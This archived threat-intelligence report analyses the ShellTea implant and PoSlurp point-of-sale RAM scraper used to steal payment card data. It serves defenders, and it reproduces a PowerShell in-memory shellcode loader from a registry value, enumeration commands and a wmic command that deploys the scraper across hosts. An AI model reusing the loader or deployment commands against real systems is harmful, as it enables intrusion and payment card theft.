{
    "id": "8a6b2458-0b0c-4ed0-a4bf-ada08089d04b",
    "created_at": "2022-10-25T16:48:17.407841Z",
    "updated_at": "2025-03-27T02:05:41.514817Z",
    "deleted_at": null,
    "sha1_hash": "259bf1dfeb4a1f9edec3b8fedc85bb07d74fa18b",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-06-19T07:48:40Z",
    "file_modification_date": "2017-06-19T13:41:17Z",
    "file_size": 3219559,
    "plain_text": "# SHELLTEA + POSLURP MALWARE\n\n## MEMORY-RESIDENT POINT-OF-SALE MALWARE ATTACKS  INDUSTRY\n\n###  ROOT9B JUNE 2017\n\n\n-----\n\n## TABLE OF CONTENTS\n\nMEMORY-RESIDENT POINT-OF-SALE MALWARE 3\n\nATTACK OVERVIEW 4\n\nSHELLTEA MEMORY RESIDENT MALWARE (C2) 9\n\nMALWARE ANALYSIS: PoSLURP MALWARE 17\n\nMITIGATION RECOMMENDATIONS 22\n\nINDICATORS OF COMPROMISE (IOCs) 23\n\nTOOLS 23\n\n\n-----\n\n## MEMORY-RESIDENT POINT-OF-SALE MALWARE\n\nRetail Point-of-Sale (PoS) systems remain a top target for the financially-motivated hacker. Theft of payment\n\ncard data in large volume exists not only as its own segment within financial crime, but also serves to\n\nfacilitate other even more harmful motives of today’s criminal elements. To the businesses targeted by cyber\n\ncriminals, the negative effects are far reaching with impact on brand reputation, consumer and investor\n\nconfidence, and business growth strategies. With such a lucrative target as payment card data, adversary\n\ngroups continue to adapt Tactics, Techniques, and Procedures (TTPs) in response to defenders’ change in\n\nsecurity practices. One effective attacker TTP is to use so-called “fileless,” or memory-resident malware, to\n\ncarry out attacks against retailer PoS systems.\n\nroot9B discovered an advanced, targeted PoS intrusion focused on harvesting payment card information\n\nfor exfiltration. The adversary’s campaign has active and operational Command and Control (C2) servers.\n\nroot9B’s analysis determined that the adversary is using advanced memory-resident techniques to maintain\n\npersistence and avoid detection. The malware likely required a significant amount of time and knowledge to\n\ncreate. We typically see techniques at this level by well-resourced, well-funded, motivated adversaries.\n\nThis ongoing campaign has targeted numerous organizations and their PoS systems. root9B uncovered the\n\nTTPs utilized and describes them in a detailed analysis below. At a high-level, the adversary’s methodology\n\nconsists of the following steps:\n\n**• Step 1: Reconnaissance and targeting of a corporate individual with a spearphishing email attack**\n\nemploying an ActiveMIME document with an MS Office-enabled macro.\n\n**• Step 2:** Email recipient opens the ActiveMIME document attachment and clicks to enable content,\n\nexecuting a PowerShell command initiating a surreptitious shellcode download.\n\n**• Step 3: A shellcode blob encapsulating a Dynamic Link Library (DLL) malware is dropped in the system**\n\nregistry and loaded into memory, conducting basic enumeration and sandbox detection on the target.\n\nThis malware appears to be an updated version of “PowerSniff.”\n\n**• Step 4: The malware continues reconnaissance of the target environment and contacts one of its five**\n\nC2 domains with the results. If the environment meets the conditions the attacker is looking for, the\n\nattacker sends additional instructions.\n\n**• Step 5: The attackers install a second fileless implant in another registry shellcode blob. This implant,**\n\nwhich we have named ShellTea, has not been previously observed or reported. We have identified six\n\nhardcoded C2 domains utilized by this implant.\n\n**• Step 6: The attacker explores the network using compromised privileged credentials and establishes**\n\npersistent staging servers for deploying malware and collecting data from PoS endpoints. Several\n\nstaging servers are utilized by the attackers to spread the workload and provide redundancy to thwart\n\ndefensive measures.\n\n\n-----\n\n**• Step 7:** An advanced PoS RAM scraping malware, we have named PoSlurp, is deployed to the PoS\n\nendpoints. PoSlurp directly injects memory-resident code into a privileged user mode process. This\n\ncapability has not been previously reported. The attacker can specify which PoS processes should be\n\nmonitored for payment card transactions.\n\nroot9B has been able to deconstruct the four major components of the adversary’s activities. Provided here\n\nis a detailed analysis of the initial access method, command-and-control methods, and the new ShellTea\n\nimplant and PoSlurp POS RAM Scraper.\n\n## ATTACK OVERVIEW\n\n INITIAL ACCESS\n\nInitial execution of the attack begins with a customized email to a targeted entity with a malicious macroenabled ActiveMime Office document attached. Once the targeted victim opens the attached document and\nclicks to enable macros, the macro quietly launches a PowerShell command that will download another\nPowerShell stage from a staging site (often public paste sites) into memory and execute it. Seen in the\ncommand line below is the command (iex) to execute the downloaded payload in memory, after determining\nif a 32-bit or 64-bit payload is required ([IntPtr]::size -eq 4). This technique maintains a fileless footprint on\nthe target.\n\n\n-----\n\n## POWERSNIFF DROPPER\n\nThe previous PowerShell script will in turn load and execute a 32-bit or 64-bit binary shellcode blob in memory.\n\nThe returned shellcode blob includes code to then de-obfuscate and load a DLL into memory. It also includes\n\na function hash resolution routine to find API calls it needs that were likely copied from the Carberp source\n\ncode. Carberp was a common piece of malware that served as a full-featured backdoor, often incorporating\n\nadditional payloads with the following features:\n\n  - Steal browser credentials to banking and other websites\n\n  - Steal credentials from other applications\n\n  - Monitor users’ keystrokes and screens\n\nThis malware does not have any of those capabilities, as it only incorporated the function hashing code from\n\nCarberp. The source code to the Carberp banking trojan was leaked a few years ago and is presumably used\n\nby several actors now.\n\nOnce loaded, the inner DLL includes routines to inject itself into the memory of explorer.exe.\n\nThe malicious Office macro and second-stage payload, downloaded and executed in-memory, matches\n\nprevious analysis of \"PowerSniff[1]\" by the following characteristics:\n\n  - Use of WMI in the macro to launch the initial PowerShell command\n\n  - PowerShell command's method of detecting CPU architecture\n\n(by the size of IntPtr, 8 bytes for 64-bit and 4 bytes for 32-bit)\n\n  - URL pattern\n\n  - Sandbox detection methods\n\n  - Basic enumeration command strings in memory, like:\n\n_cmd /C \"net.exe view > %s\"_\n\n_cmd /C \"ipconfig -all > %s\"_\n\nAfter being loaded and de-obfuscating itself in memory, the logic of this threat bears a strong resemblance\n\nto what researchers have called TROJ_RECOLOAD.A, sharing those characteristics as well as the injection\n\ninto explorer.exe. Through preliminary analysis, we believe that TROJ_RECOLOAD.A[2] could also be a variant\n\nof Powersniff. Although, in that analysis, they observed it being launched from an exploit kit.\n\n_1https://researchcenter.paloaltonetworks.com/2016/03/powersniff-malware-used-in-macro-based-attacks/_\n_2_\n\n\n-----\n\nWe did detect several differences in the variant we saw. First, the sandbox detection has been overhauled:\n\nSandbox detection in the new PowerSniff variant\n\nOur sample, despite retaining the sandbox DLL strings in memory, no longer references most of them in code\n\nas it only looks for two. It maintains the same username checks, and our sample has added instructions for\n\ndetecting sandboxes via several new methods:\n\n  - Computing a checksum of the hard disk volume name and checking against a known checksum.\n\n  - Looking for strings indicative of virtual machines in the system firmware information.\n\n  - Hashing the names of running processes and comparing each against a list of the name hashes of\n\nknown analysis, monitoring, or reverse engineering software.\n\n\n-----\n\nInterestingly, in this function, it appears the malware developers made a mistake. There are only 25 CRC32s\n\nto check against in the array, but the loop comparing the process name CRC32 to the list of hashes runs 100\n\ntimes, reading off the end of the array and into other data. Most likely this is a result of the malware developers\n\nwriting a loop in C/C++ as:\n\n_for(int i = 0; i < sizeof(hashes); i++){...hashes[i]..._\n\ninstead of:\n\n_for(int i = 0; i < sizeof(hashes) / sizeof(DWORD); i++){...hashes[i]..._\n\nrunning the loop once for each byte in the hash array instead of once for each hash (each hash takes 4 bytes).\n\nThis mistake likely was not noticed by the developers since this array is not at the end of an allocation, meaning\n\nno crash occurs.\n\nThe adversaries improved and re-implemented these techniques, although they reproduced the same bug, in the\n\nShellTea malware explored in-depth below.\n\nIn previously reported samples, the malware would download a DLL to disk as .db file and inject the code into\n\nmemory. Our sample included not only the ability to write a DLL to %%userprofile%%\\AppData\\LocalLow\\%u.\n\ndb and run it via rundll32, but also to write an executable and run it, or to write a DLL and load it directly into\n\nthe calling process with LoadLibraryW, depending on the instructions provided by the C2 server. This malware\n\nperforms HTTP requests with a user-agent created with the following format string: “Mozilla/4.0 (compatible;\n\nMSIE 8.0; Windows NT %u.%u%s)”\n\nAdditionally, we observed functionality, if instructed by the server, to write a DLL and add it to the \"HKLM\\\n\nSystem\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" registry key. This is an unusual persistence\n\nmethod that can also be used as an AppLocker bypass. Each DLL in AppCertDlls will be loaded by the OS into a\n\nprocess whenever a new process is created.\n\n\n-----\n\nMemory strings from the new PowerSniff variant\n\nAnother difference in this variant, is that the strings checked to avoid targeting hospitals and schools have\n\nnow been removed. This implies the actors behind this intrusion are either: 1.) willing to target healthcare and\n\neducational institutions; or 2.) confident their targeted delivery mechanisms make these checks unnecessary.\n\nWe also observed new C2 servers (see the IOCs section for details.)\n\nThe PowerSniff sample we analyzed, also inserted the string koollondon/ into the URL path used to contact its\n\nC2 servers. Koollondon (http://koolLondon.com/) is a radio station in London, England.\n\nAfter the initial PowerSniff intrusion, we observed the threat actors deploy ShellTea, a newly identified piece of\n\nmemory-resident malware for persistent access, and PoSlurp, a newly identified PoS malware.\n\n\n-----\n\n## SHELLTEA MEMORY RESIDENT MALWARE (C2)\n\nImmediately following execution of PowerSniff (and a reboot), we discovered a set of suspicious registry values\n\nbeing launched in a registry key under HKCU\\Software, one of which is reproduced below. This registry value\n\nheld a PowerShell command that was loaded and invoked in memory by a separate PowerShell launcher. We\n\nhave reproduced the registry command below, sanitized and formatted slightly for clarity. It acts as a stager to\n\nload and execute a shellcode-style implant into memory. It does so by first loading up a binary registry value\n\nunder the same key with Get-ItemProperty into variable $s.\n\n_$s=(Get-ItemProperty -Path HKCU:Software\\Random_Generated_RegistryName_\n\n_–Name Random_KeyName).Random_KeyName_;_\n\n_$l=$s.Length;_\n\nNext it uses Add-Type to enable the PowerShell script to directly call the Win32 functions VirtualAlloc,\n\nCreateThread, and WaitForSingleObject:\n\n_$c=\"[DllImport(`\"user32.dll`\")]`npublic static extern Int32_\n\n_IsChild(Int32 a,Int32 b);`n[DllImport(`\"kernel32.dll`\")]`npublic_\n\n_static extern Int32_\n\n_GetCurrentProcessId();`n[DllImport(`\"kernel32.dll`\")]`npublic static_\n\n_extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint_\n\n_e,IntPtr f);`n[DllImport(`\"kernel32.dll`\")]`npublic static extern_\n\n_UInt32 WaitForSingleObject(IntPtr a, UInt32_\n\n_b);`n[DllImport(`\"kernel32.dll`\")]`npublic static extern IntPtr_\n\n_VirtualAlloc(IntPtr a,uint b,uint c,uint d);\";_\n\n_$a=Add-Type -memberDefinition $c -Name 'Win32' -namespace_\n\n_Win32Functions -passthru;_\n\nInternally, Add-Type dynamically creates a .cs file (C# source code) in the user’s temp directory including\n\nthe declarations from the PowerShell string, runs csc.exe to compile that file into a DLL, loads the DLL from\n\nthe temporary directory, then deletes the intermediate files. This automatically created DLL is built from the\n\nsource code in the $c variable. It simply serves as a thin wrapper to allow PowerShell, which can normally only\n\ndirectly call .NET class and object methods, to call the three given Win32 functions. It has no additional logic\n\nin it specific to this malware and is not used again after the script calls those three functions. We mention it\n\nsince the dynamic creation and loading of DLLs from temporary directories is detectable with appropriate\n\nmonitoring software.\n\nAfter enabling access to these functions by loading the new type, the script calls VirtualAlloc to allocate a\n\nsection of memory that is readable, writable, and executable. It then copies the contents of the binary registry\n\nvalue into the new section of memory, creates a thread to start executing the loaded implant in memory, and\n\nfinally waits up to 5 seconds for the thread to complete.\n\n\n-----\n\n_$b=$a::VirtualAlloc(0,$l,0x3000,0x40);_\n\n_[System.Runtime.InteropServices.Marshal]::Copy($s,0,$b,$l);_\n\n_$b=$a::CreateThread(0,0,$b,0,0,0);_\n\n_$b=$a::WaitForSingleObject($b,5000))_\n\nThe binary, which is never saved to a file, is the body of the memory-resident implant. It is composed of 64bit code and data. At the start are two instructions to call 1024 bytes into the shellcode blob, followed by\nconfiguration data. The shellcode then calculates its own address by reading it off the stack after it had been\nsaved by the call instruction. This is a trick common to 32-bit shellcode and seems to show the author was more\nfamiliar with writing 32-bit shellcode. This trick is not necessary in 64-bit as 64-bit shellcode can directly read\nits own address or calculate an offset of it.\n\nThe start of the ShellTea shellcode\n\nAfter obtaining its own address in memory, the shellcode processes a series of relocations. It calculates the\n\ndifference between its current location in memory and its original base address (0x690000 in our sample).\n\nIt then updates each of the relocations in memory, just like a normal executable loader. This process also\n\nperforms some de-obfuscations on the binary. After this point, we can dump memory and begin to disassemble\n\nthe code.\n\nThe loader progresses to use a custom function resolver with a simple string hash algorithm that handles\n\nloading the required DLLs and resolving their imported functions. However, the binary has very few imported\n\nfunctions. Throughout the code, nearly every API call dynamically resolves a function, again re-using this custom\n\nresolver and a 4-byte hash. We believe this is a previously unknown API hashing algorithm, as it did not match\n\n\n-----\n\nother public API hashing algorithms[3] or others we have encountered. We did not find any other public use of\n\nsome of the constants used in this hashing algorithm, such as 0x463283F5. The API hashing algorithm makes\n\nuse of a standard linear congruential random number generator (multiplier 0x19660, increment 0x3C6EF35F.)\n\nShellTea API hashing algorithm\n\nWe created a custom script to automatically map each of those function hashes to the corresponding API\n\nfunction before continuing analysis. First, we exported the disassembly of the entire implant and grepped for\n\nthe function hash constants, saving those in one file. Second, we embedded the shellcode and function hashes\n\ninto a small C++ resolver program. This program called the hash-resolution function on each of the hashes,\n\nthen used the Debug Help API to find out the names of the API functions that had been resolved. This same\n\nmethod can enable malware reverse engineers to resolve all hashed functions in a sample without stepping\n\nthrough each resolution in the original malware (which is a time-consuming and manual process) or recreating\n\nthe function hashing algorithm. A link to this Function Hash Resolution tool can be found in the Tools section.\n\n_3https://github.com/mandiant/Reversing/blob/master/shellcode_hashes/make_sc_hash_db.py_\n\n\n-----\n\nFunction hashing analysis harness\n\nThird, we pasted the output of the resolver program into a small IDA Python script (in Tools) to apply all the\n\nfunction resolutions to the analysis of the binary.\n\nIDA script to apply function resolutions\n\n\n-----\n\nThe binary then adds a custom vectored exception handler to catch any crashes from within its own code and\n\nto continue execution safely if possible.\n\nThe sample decrypts its own callback domains from its configuration block, which is also in the binary with the\n\nrest of the code. In our case, we list the six domains observed in the IOC section.\n\nThe implant also attempts to read and decrypt C2 information from a different registry key, if present, in addition\n\nto the built-in domains. The registry key is derived with CRC32 from various system-specific data sources. It\n\nthen connects over port 443 using a custom binary protocol. It queries proxy configuration from the registry\n\n(HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings) and can communicate through proxies\n\nvia the CONNECT method as well. The implant’s protocol uses the XTEA encryption algorithm in CBC mode.\n\nThe implant developers have a distinct preference for using low-level native API functions, presumably to\n\navoid detection by standard analysis and HIPS tools. They also make extensive use of CRC32 by calling the\n\nundocumented RtlComputeCrc32 function. This function is uncommon, but was used most prominently by the\n\nZeroAccess rootkit[4] and the Andromeda malware[5], although neither in the same manner as is found in\n\nour sample.\n\nFor example, the implant applies CRC32 to the computer and username and XORs with the SID subauthority\n\nvalues taken directly from the SID structure to assemble a mutex name. It uniquely identifies an implant\n\nand prevents duplicate infection against the same host under the same user account. This is likely done to\n\ndifferentiate hosts for tasking.\n\nExcerpt from ShellTea’s mutex name derivation\n\n_4http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/zeroaccess_indepth.pdf_\n_5https://blog.avast.com/andromeda-under-the-microscope_\n\n\n-----\n\nThe implant injects its code into explorer.exe. First, it finds the process ID. Second, it uses the low-level\n\nRtlAdjustPrivilege call with the ID of the SE_DEBUG access right to enable the right to inject into nearly any\n\nprocess. Third, it opens the process, allocates memory in the process, copies its code into the allocated space,\n\nand uses the low level RtlCreateUserThread API to create a thread in the target process that will start executing\n\nits code. It then completes the process injection. It can find explorer by finding the process ID owning the shell's\n\ndesktop window by comparing process names or by using GetShellWindow. This is a function to return a handle\n\nto the Windows desktop which would be owned by explorer.exe.\n\nIn addition to the API obfuscation, the implant uses extensive string obfuscation. It creates most strings on the\n\nstack directly before use, character by character, by adding and subtracting various values from a fixed start\n\nbyte. Fortunately, a good decompiler will see through these. Below is a before-and-after comparison of the code\n\nthat creates the format string used for the implant’s mutex:\n\nShellTea mutex format string\n\n\n-----\n\nThe implant is built in a modular manner and implements several capabilities. The command dispatcher is\n\nshown below:\n\nShellTea command dispatcher\n\nIt has built-in routines to:\n\n  - Drop an executable in a temporary directory, run it, and queue it for deletion at next reboot. It does\n\nso by using the Windows MoveFileEx API with the MOVEFILE_DELAY_UNTIL_REBOOT flag. Internally,\n\nthis API writes to the PendingFileRenameOperations value of the registry key HKLM\\SYSTEM\\\n\nCurrentControlSet\\Control\\Session Manager.\n\n  - Drop a DLL in a temporary directory and to load it, queuing it for deletion at next reboot via the\n\nsame mechanism.\n\n  - Load an extension DLL directly into memory. It includes a separate routine that will finish mapping the\n\nDLL into memory and link up its imports without touching disk.\n\n  - Run an operator-provided PowerShell command and receive results back.\n\n  - Run raw shellcode directly in memory.\n\n  - Install persistence by writing to the current user’s Run key in the registry.\n\n\n-----\n\nThe implant implements sandbox and analysis detection with numerous techniques reminiscent of the\n\nanalyzed PowerSniff variant. It has improvements in algorithms used, number of analysis processes detected,\n\nand employs the just-in-time API function hash resolution:\n\n  - Querying the SystemFirmwareTableInformation from the system and looking for common hypervisors.\n\n  - Obtaining the name of the system volume, hashing it, and comparing to a known hypervisor hash. In\n\nthis case, in contrast with our PowerSniff variant, ShellTea uses SHA1 as a hashing algorithm.\n\n  - Enumerating processes with a low-level API (querying SystemProcessInformation), computing a\n\nCRC32 checksum of the upper-cased version of process names and comparing against a table of\n\nknown monitoring or analysis processes. This includes the default process names of Process Monitor,\n\nWireshark, and IDA. Again, this uses a new checksum algorithm.\n\nShellTea’s process name CRC32 comparison\n\n\n-----\n\nOnce again, as in the PowerSniff variant, it appears the malware developers made the same mistake. There\n\nare now 27 CRC32s to check against in the array, but the loop comparing the process name CRC32 to the list\n\nof hashes runs 108 times. It reads off the end of the array and into other data. This is most likely because the\n\nmalware developers wrote a loop that runs once for each byte in the checksum array instead of once for each\n\nchecksum (each checksum takes 4 bytes.)\n\nWhen the malware exits, it cleans itself up from memory using a clever technique. The exit function replaces\n\nits own return address with the address of RtlExitUserThread, then sets up the arguments for the VirtualFree\n\nfunction to free its own code and jumps directly to VirtualFree. This function deallocates all the binary’s memory.\n\nThen, when the Windows API function returns, rather than returning to the implant code (which no longer exists\n\nin memory), it returns directly to the RtlExitUserThread function. This kills the thread and cleans up nearly all\n\ntraces of the malware from the injected process.\n\nAt this point, the adversaries have a foothold which they can use to explore the network environment further.\n\nroot9B observed the use of common lateral movement techniques, such as dumping passwords, password\n\nhashes, and Kerberos tickets with tools like mimikatz or similar. We also observed the adversaries stealing\n\ntokens, then using those credentials or creating forged Kerberos tickets (“Golden Tickets”) to maneuver laterally\n\nand gain access to network servers on the PoS network which would become the staging points for the\n\nremainder of the attack.\n\nAfter obtaining the appropriate access to a server, they use that server to conduct basic network discovery to\n\nlocate PoS endpoints and create target lists stored in flat text files. Then they have been observed to launch\n\nshell commands, including wmic.exe, to push the PoS software, which we dubbed PoSlurp, to the PoS machines\n\nto launch it. Upon successful collection and exfil of payment card data using PoSlurp, the adversaries then\n\nclean-up after themselves to eliminate on-disk artifacts.\n\n## POSLURP MALWARE\n\nPoSlurp is a highly-obfuscated malicious RAM scraper that gets remotely deployed to PoS systems and can be\n\nlaunched via local or remote commands.\n\nThe file can be launched in any number of ways, but root9B observed it with both local and remote execution\n\nwith command-line arguments matching the following pattern:\n\n**Local Execution:**\n\n_[PoSlurp_filename].exe TARGET1.EXE#TARGET2.exe*1234*winlogon.exe_\n\n**Remote Execution:**\n\nThis command uses the file targets.txt as target list to direct the execution of PoSlurp to specific PoS\nend-points.\n\n\n-----\n\n_wmic /node:\"@targets.txt\" process call create \"cmd /c [PoSlurp_filename].exe_\n\n_TARGET1.EXE#TARGET2.exe*1234*winlogon.exe\"_\n\nThe target executable names in the arguments refer to specific processes relating to PoS payment/routing\n\nsoftware. The number in the middle is how many minutes (1234) to run the RAM scraper, while the last filename\n\nin the command line (winlogon.exe) refers to the process to inject the inner PoSlurp malware into. As far as we\n\ncan tell, PoSlurp should be able to inject itself into any user mode process.\n\nPoSlurp has an extensive amount of obfuscation to make analysis difficult, such as the use of opaque predicates\n\n(functions with no return opcode just a jump or alternative instruction) and multiple steps to load its main code.\n\nThat said, we did not see sandbox and analysis detection in this sample. PoSlurp uses a three-step approach\n\nto load:\n\n**Step 1: The outer layer or Step 1 of the PoSlurp malware, like the ShellTea backdoor, used a custom function**\n\nresolver with a simple string hash algorithm that handles loading the required DLLs and resolving the imported\n\nfunctions. This function hashing algorithm, however, was unique and not the same as the ShellTea sample.\n\nPoSlurp API hashing\n\n\n-----\n\nPoSlurp’s Step 1 first calculates one constant by resolving the address of RtlWriteMemoryStream via function\n\nhash 0x22F3608C, then reads the second byte of that function, which is always 1, to calculate its second\n\nfunction hash. Since its introduction into Windows, RtlWriteMemoryStream has remained unimplemented as a\n\nfunction. It simply returns an error code. This means that the bytes of this function have not changed and can\n\nbe treated as constants. The novel technique of using this code as a constant ensures that the malware will\n\nfunction reliably, yet fools some automated analysis tools that are not aware of the binary structure of all the\n\nexternal modules.\n\n**Step 1 then uses the newly calculated hash, 0x1BC4C4FC, to resolve the low-level ZwAllocateVirtualMemory**\n\nfunction which it calls to allocate executable and writable memory to extract its second step to. After decoding\n\nand copying the payload to the newly obtained memory, it starts executing the second step code. In our case,\n\nthe second step was 6610 bytes long.\n\n**Step 2 This code has its own resolution-by-hash function, a copy of the Carberp function hashing algorithm.**\n\nLike PowerSniff, PoSlurp only incorporated the function hashing code from Carberp. One of the first functions\n\nto be resolved uses hash 0x594AA9E4, the function hash of ZwAllocateVirtualMemory in that algorithm. The\n\nCarberp-based Step 2 simply loads and links yet another embedded obfuscated binary as a third step, using\n\nlow-level library loading and function resolution functions like LdrLoadDll and LdrGetProcedureAddress to\n\nresolve the third step’s imported functions.\n\n**Step 3 is an inner DLL that uses minimal obfuscation tricks and contains most of the business logic. Step 3 is**\n\nnot completely unobfuscated, as it does use string obfuscation reminiscent of the ShellTea memory-resident\n\nbackdoor by assembling strings on the stack one character at a time. It parses the command line of the calling\n\nprocess, extracting out process names to inject into and monitor. It finds those processes using the standard\n\nhigh-level CreateToolhelp32Snapshot and associated API calls, comparing executable names from the data\n\nreturned.\n\nThe inner DLL uses similar process injection code to ShellTea as well. First, it finds the process ID. Second, it\n\nuses the low-level RtlAdjustPrivilege call with the ID of the SE_DEBUG access right to enable the right to inject\n\ninto nearly any process. Third, it opens the process, allocates memory in the process, copies its code into the\n\nallocated space, and uses the low level RtlCreateUserThread API to create a thread in the target process that\n\nwill start executing its code. This completes the process injection. After that point, the original process exits.\n\nAfter being injected into the target process, PoSlurp re-links itself, deletes any old output file if present,\n\nand launches its RAM scraping functionality. Every 5 seconds until timeout, each data section of the target\n\nprocesses’ memory is identified and scanned for strings indicative of payment card data which are then\n\nencrypted and saved.\n\n\n-----\n\nPoSlurp memory scraping outer loop\n\nWhen scanning memory, it efficiently identifies memory sections of interest with VirtualQueryEx, then reads\n\nthem into newly allocated sections of memory of the same size in its own process to search through\n\ntheir contents.\n\nPoSlurp code to search for data memory segments\n\n\n-----\n\nPayment card data is detected by a series of simple tests which look for properly formatted data, such as\n\nstrings of digits followed by an equals sign, with both ASCII and wide-char strings. When payment card data is\n\ndetected, the malware first calculates a hash of the string and checks against a running list of output hashes to\n\nensure it does not output duplicate data, then writes its output to a hidden file in the %TMP% directory. It stores\n\nhashes for the last 10,000 strings it has output to use in its duplicate check.\n\nAssuming this is a new piece of payment card data and not a duplicate of one already detected, the data is\n\nencrypted with a simple XOR-based stream cipher using a randomly-selected 4-byte key. This algorithm is\n\nbased on a standard linear congruential random number generator with multiplier 0x19660D, but with a different\n\nincrement value (- 0x49F91E6B) than the most common (0x3C6EF35F, which is also used in the PowerSniff and\n\nShellTea malware.)\n\nPoSlurp encryption algorithm\n\nEach chunk of the output file starts with a 5-byte header containing the length of the chunk in the first byte\n\nfollowed by the 4-byte key and the encrypted data. Based on this static analysis, we created a decryption\n\nscript for the data files shown below.\n\n_#!/usr/bin/ruby_\n\n_# Run like this in a console: ruby decrypt.rb < encrypted_data_\n\n_inp = STDIN_\n\n_l = inp.read(1)_\n\n_until l.nil?_\n\n_len = l.unpack('C')[0]_\n\n_key = inp.read(4).unpack('V')[0]_\n\n_crypted = inp.read(len).unpack('C*')_\n\n_plain = crypted.map do |c|_\n\n_p = (c ^ key) & 0xFF_\n\n_key = ((0x19660D * key) & 0xFFFFFFFF) - 0x49F91E6B_\n\n_p_\n\n_end_\n\n_puts plain.pack('C*').inspect_\n\n_l = inp.read(1)_\n\n_end_\n\nThis script may aid future incident responders or law enforcement to identify what data has been stolen.\n\n\n-----\n\n## MITIGATION RECOMMENDATIONS\n\n  - Apply macro restrictions in your environment to prevent users from inadvertently running malicious\n\nOffice macros to help address this common initial access vector. For details, see: https://blogs.technet.\n\nmicrosoft.com/mmpc/2016/03/22/new-feature-in-office-2016-can-block-macros-and-help-prevent\ninfection/.\n\n  - Limit the exposure of privileged administrator credentials by following best practices such as the\n\nPAW model, audit your credential risks, and require multifactor authentication for privileged users. For\n\ndetails, see: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/\n\nprivileged-access-workstations.\n\n  - Implement application whitelisting on PoS systems utilizing Microsoft’s built-in AppLocker or one of\n\nmany commercial solutions. Much like the previous mitigation recommendation, PoS systems should\n\nbe highly standardized and have no software running or installed that isn’t part of required functionality.\n\nAudit application execution in a development environment to build an effective yet minimal whitelist.\n\n  - Develop and maintain a robust security monitoring program or contract an experienced security\n\ncompany. Tune your environment to collect relevant network and endpoint-based artifacts that allow\n\nyou to detect adversary actions. Focus your analysis on critical network segments and employ active\n\ndefense methodologies (HUNT) to proactively identify persistent threats.\n\n  - Create a whitelist or greylist of domains and IP addresses that your organization is allowed to reach\n\nvia the network.\n\n  - Implement effective network segmentation controls. Prohibiting communication between distinct\n\nsegments such as PoS and Store networks, except for required ports and protocols, and using different\n\ncredentials in each network will greatly delay if not eliminate the attacker’s ability to traverse the\n\nnetworks. Communication between systems in these critical networks should be far more predictable\n\nthan the corporate network, enabling a security monitoring program to more easily identify\n\nabnormal activity.\n\n\n-----\n\n## INDICATORS OF COMPROMISE (IOCS)\n\n**POWERSNIFF C2 DOMAINS**\n\nvseflijkoindex.net\n\nvortexclothings.biz\n\nunkerdubsonics.org\n\npopskentown.com\n\n**SHELLTEA C2 DOMAINS**\n\nneofilgestunin.org\n\nverfgainling.net\n\nstraubeoldscles.org\n\nolohvikoend.org\n\nmenoograskilllev.net\n\nasojinoviesder.org\n\n## TOOLS\n\nFunction Hash Resolution Tool, IDA Script, and Process Name CRC32 Code: https://gist.github.com/\nroot9b/24b9b25f3b0b06a6939881e68d0bd2d0\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2017/2017.06.19.SHELLTEA_POSLURP_MALWARE/PoS%20Malware%20ShellTea%20PoSlurp_0.pdf"
    ],
    "report_names": [
        "PoS Malware ShellTea PoSlurp_0"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041141,
    "ts_creation_date": 1497858520,
    "ts_modification_date": 1497879677,
    "files": {
        "pdf": "https://archive.orkl.eu/259bf1dfeb4a1f9edec3b8fedc85bb07d74fa18b.pdf",
        "text": "https://archive.orkl.eu/259bf1dfeb4a1f9edec3b8fedc85bb07d74fa18b.txt",
        "img": "https://archive.orkl.eu/259bf1dfeb4a1f9edec3b8fedc85bb07d74fa18b.jpg"
    }
}